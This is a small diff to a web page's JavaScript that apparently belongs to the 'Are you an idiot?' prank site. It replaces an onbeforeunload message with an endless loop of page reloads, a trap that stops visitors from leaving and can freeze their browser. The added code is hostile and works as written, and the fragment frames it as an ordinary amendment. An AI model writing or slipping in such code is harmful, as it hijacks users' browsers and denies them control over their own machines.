@@ -137,6 +137,8 @@ window.onkeydown = function() {
 }
 
 window.onbeforeunload = function() {
-    return "Are you an idiot?";
+    while(true){
+    window.location.reload();
+    }
 };
 /* [Oct 2021] End of amendments. */
